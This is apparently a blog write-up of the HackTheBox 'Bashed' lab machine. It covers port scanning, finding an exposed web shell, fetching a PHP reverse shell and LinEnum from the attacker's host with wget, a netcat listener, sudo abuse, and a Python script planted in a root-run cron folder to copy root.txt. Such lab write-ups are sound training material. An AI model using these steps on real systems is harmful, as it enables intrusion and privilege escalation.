Title: Bashed
Date: 2020-01-13 20:00
Tags: hackthebox, htb, solution, hacking
Category: HackTheBox
Slug: bashed
Authors: Paweł Mateja
Summary: Solution to the *Bashed* VM


# User flag

It is not really necessary to start this one with *nmap*, but it's never a bad first step

```bash
root@kali:~# nmap -sS -Pn -sV 10.10.10.68
Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-13 13:20 CET
Nmap scan report for 10.10.10.68
Host is up (0.11s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds
```

As we can see, only port 80 is opened. After opening it in web browser, there is a unfinished, but already launched website. We can dig a bit through it, just to learn that it is connected to a *phpbash* project. That's nice, but we want to speed things up.

We can run several tools to look for cool and useful, but hidden urls. My first choice here is DirBuser.
It takes him a few minutes to find the thing we need:

```
http://10.10.10.68/dev/phpbash.php
```

After opening that link we know that we are in the right place. It's an online bash terminal. So wy not to try to look for the first flag?

```
$ ls /user
$ cat /home/arrexel/user.txt
```

Yup, we got it!

# Root flag

*phpbash* is nice, but doesn't provide a full terminal experience. A reverse shell is wat we need.

Firstly we need a place in the /var/www/html path to store it. Only the *upload* dir will do, but we need nothing more. Except of course of a php reverse shell with out IP in it's config. I've already got it on my Kali VM, served by an apache instance, so it's easy:

```bash
www-data:/var/www/html/uploads# wget 10.10.14.16/shell.php
```

Now I can open netcat on my Kali, and load 10.10.10.68/upload/shell.php in my web browser.

```bash
root@kali:/var/www/html# nc -v -n -l -p 1234
```

It works, so now the same thing in */tmp* dir *LinEnum*

```bash
cd /tmp
wget 10.10.14.16/LinEnum.sh
bash LinEnum.sh
```

We can see good stuff in it's output!

```
[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

We knew about this user already from listing the home directory. Now we can sudo it.

```bash
$ sudo -u scriptmanager bash
```

Works. What next? We need something to find a point for privilege escalation. *pspy* will help us with it.

```
pspy64
```

```
2020/01/13 05:46:01 CMD: UID=0    PID=2297   | python test.py
2020/01/13 05:46:01 CMD: UID=0    PID=2296   | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
```

Nice, we can see, that */scrips* dir is owned by *scriptmanager*!

Now we need a tiny root.txt stealing python script. It doesn't need to be fancy.

```python
import shutil
import os
shutil.copy("/root/root.txt", "/tmp/root.txt")
os.system("chmod 777 /tmp/root.txt")
```

As in every step, I've served it on my Kali apache, so:

```bash
$ wget 10.10.14.16/bashed/run.py

sudo -u scriptmanager cp run.py /scripts
$ cat /tmp/root.txt
```

IT'S ROOTED. It was not difficult but fun!
